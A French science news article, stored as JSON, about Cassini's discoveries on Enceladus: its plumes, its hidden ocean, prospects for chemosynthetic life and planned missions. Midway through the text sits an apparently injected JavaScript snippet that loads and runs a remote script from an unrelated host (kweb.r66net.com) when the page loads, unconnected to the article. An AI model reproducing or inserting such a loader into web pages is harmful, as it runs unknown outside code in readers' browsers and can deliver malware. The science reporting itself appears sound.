{"title": "Encelade abriterait une chimie prebiotique", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-09-22", "content": "Alors que s'est terminee la mission Cassini-Huygens, Gabriel Tobie, specialiste des << interieurs planetaires >> au laboratoire de planetologie et geodynamique de Nantes, nous explique pourquoi les scientifiques pensent qu'Encelade, lune de Saturne, abrite vraisemblablement une zone d'habitabilite. Sous sa croute de glace, l'ocean cache pourrait receler une forme de vie ! Ce qu'il faut retenir Consideree comme un objet mort avant l'arrivee de Cassini, la lune Encelade presente des conditions compatibles avec l'existence d'une forme de vie simple, basee sur la chimiosynthese et non la photosynthese ; La zone d'habitabilite des etoiles, telle qu'elle est definie aujourd'hui, est remise en cause. La vie pourrait exister au sein d'oceans extraterrestres du Systeme solaire, bien au-dela de la region autour du Soleil ou l'eau peut rester a l'etat liquide en surface.  Les  geysers  d' Encelade , satellite de seulement 500 km de diametre, costituent tres certainement la plus grande decouverte de la mission Cassini-Huygens.  << On ne s'y attendait pas >>  nous explique Gabriel Tobie, charge de recherche au CNRS. Ce chercheur au laboratoire de  Planetologie et Geodynamique  de l'universite de Nantes prefere utiliser le terme de << jets de  matiere  >> plutot que de geysers car  << les mecanismes qui les animent sur Encelade sont tres differents de ceux des geysers terrestres >> . Decouverts en 2005, ces  jets de matiere  sont  << composes de grains de glace et de vapeur d'eau >> . A sept reprises, entre 2005 et 2015, Cassini a traverse ces jets, ce qui a permis aux scientifiques de mesurer la composition des grains.  << Ils contenaient des sels similaires a ceux presents dans les oceans terrestres [mais aussi] des  molecules  organiques assez simples dont on suppose qu'elles sont les residus de molecules plus complexes. >> En 2016, Cassini a confirme que  << ces jets avaient un lien avec l'ocean que l'on sait present sous la  surface glacee d'Encelade  >> . Cette certitude vient du  mouvement  de  libration  de la  lune , une irregularite de sa rotation liee aux effets de  marees .  << A partir de ce mouvement, on a pu determiner ce qui se cache sous la glace d'Encelade. >>  Ces changements de rotation prouvent qu'il y a une couche  liquide  en profondeur,  << un  ocean global , profond de quelque 30 a 40 kilometres >> . Cet ocean se situe de 20 a 25 kilometres en moyenne sous la surface.  << Mais on pense qu'au pole sud, l'epaisseur de la glace est tres faible, moins de 5 kilometres. >>  Les jets observes par la sonde Cassini sont donc directement lies a cet ocean. Pour expliquer l'amincissement de la couche de glace au pole sud,  << on suppose la presence au fond de cet ocean de  sources d'eau chaude  >> . Figure en fausses couleurs representant l'epaisseur de la couche de glace d'Encelade, atteignant 35 kilometres dans les zones equatoriales craterisees (couleur jaune) et moins de 5 kilometres au niveau de la zone active du pole sud (couleur bleu), ou se trouvent des fractures de grandes tailles, grossierement paralleles, les << rayures du tigre >>, visibles sur cette image, en bas. (c) LPG, CNRS, universite de Nantes, universite Charles de Prague                               Une opportunite unique d'etudier un ocean extraterrestre C'est aussi un indice tres fort que  << l'eau liquide de ces jets provient de cet ocean souterrain >> . L'ocean interne d'Encelade n'est pas le seul cas connu dans le  Systeme solaire  (Europe et  Ganymede , par exemple, des satellites de  Jupiter , en possedent un). Mais il est pour nous unique car  << pour la premiere fois, des instruments ont pu en analyser la composition en passant dans ces jets >> .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'etude de cet ocean ouvre de nombreuses perspectives sur toutes les questions liees a la vie. Bien que cela soit tres speculatif, Gabriel Tobie s'interroge sur  << l'existence d'une  chimie  pouvant amener au developpement d'une forme de vie >> . Cependant, precise-t-il,  << il ne fait guere de doute que cet ocean contient tous les elements pour faire emerger une forme de vie, dont l' energie  viendrait de la  chimiosynthese , mais la comparaison avec la chimiosynthese terrestre n'est pas aussi evidente qu'il y parait >> . Sur  Terre ,  << les  ecosystemes  de ce type, par exemple autour des  sources hydrothermales , dans l'ocean, ne sont pas totalement independants de la  photosynthese de surface  >> . En effet,  << beaucoup de  nutriments  tombent sur le  plancher  oceanique et contribuent a la  chaine alimentaire  de ces milieux >> . Sur Encelade, bien sur, sous l'epaisse couche de glace, la  photosynthese  est impossible. Autre question, celle de longevite de l'activite de cette petite lune :  << 10, 100 millions d'annees, voire plusieurs milliards d'annees, c'est tres difficile a determiner >> . La reponse a cette question fondamentale  << determine la possibilite ou non qu'une vie s'y soit developpee >> . Sur Terre, quelques milliards d'annees  << ont ete necessaires pour que des organismes multicellulaires  emergent  durablement des profondeurs des oceans >> . Enfin, les scientifiques souhaiteraient comprendre  << comment Encelade est devenue une lune tres active >>  alors que  Mimas , autre lune de  Saturne , apparait  << completement inerte malgre sa taille similaire a Encelade et sa proximite >> . Une situation qui n'est pas sans rappeler  Venus  et la Terre,  << deux planetes qui se ressemblent, notamment par la taille, mais qui ont connu des evolutions tres differentes >> . << Les reponses a ces questions ne se trouvent pas dans les donnees de Cassini qui restent a exploiter et ne pourront pas etre obtenues depuis des observations terrestres >> . Seule une mission a destination d'Encelade pourrait en fournir.  << Chercher des signatures d'activite biologique est a notre portee, en analysant la composition chimique precise des grains emis par Encelade. Cependant, la detection d'un organisme vivant apparait tres difficile >> . Cela necessiterait de collecter des echantillons proches de la surface et  << l'utilisation de technologies qui restent encore difficiles a spatialiser >> . Les fractures dans la croute de glace d'Encelade (en fausses couleurs), observees en 2005 par la sonde Cassini. (c) Nasa, JPL, Caltech, SSI                               Retour sur Encelade : pas avant les annees 2030 En Europe, plusieurs projets ont ete proposes pour retourner explorer les  lunes de glace  du systeme solaire exterieur mais, a ce jour, aucune mission a destination d'Encelade n'a ete selectionnee. La prochaine grande mission de l'Agence spatiale europeenne ( ESA ), appelee Juice ( JUpiter ICy moon Explorer ), a pour destination les mondes de Jupiter. Elle doit aller etudier Europe et  Callisto  avant de terminer sa mission autour de Ganymede. Son lancement est prevu en 2022 et la sonde devrait atteindre Jupiter en 2030. Une mission de la Nasa a destination d'Europe, denommee  Europa Clipper , est egalement en cours de developpement. Elle aura pour objectif de caracteriser la surface et la subsurface d'Europe et de preparer la prochaine etape qui consistera a deposer un atterrisseur. Une mission conjointe de la Nasa et l'ESA, appelee  Joint Europe Mission , pourrait etre envisagee pour cette seconde phase d'exploration, mais elle demeure pour le moment a l'etat de concept. Aux Etats-Unis, deux missions a destination d'Encelade et trois vers  Titan  ont ete proposees dans le cadre du programme  New Frontiers  de la Nasa avec une opportunite de lancement en 2024 ou 2025. Mais seule une destination sera choisie. En effet, afin de ne pas polluer les instruments de mesure, il n'est pas possible d'envisager une meme sonde pour etudier de pres ces deux lunes. Cassini : les plus belles surprises                       Dans cette video du Cnes (Centre national d'etudes spatiales), des chercheurs passionnes nous expliquent les decouvertes de la sonde Cassini, restee treize annees autour de Saturne. Des reponses a de multiples questions... et de nouvelles questions !                                       ", "theme": "sciences"}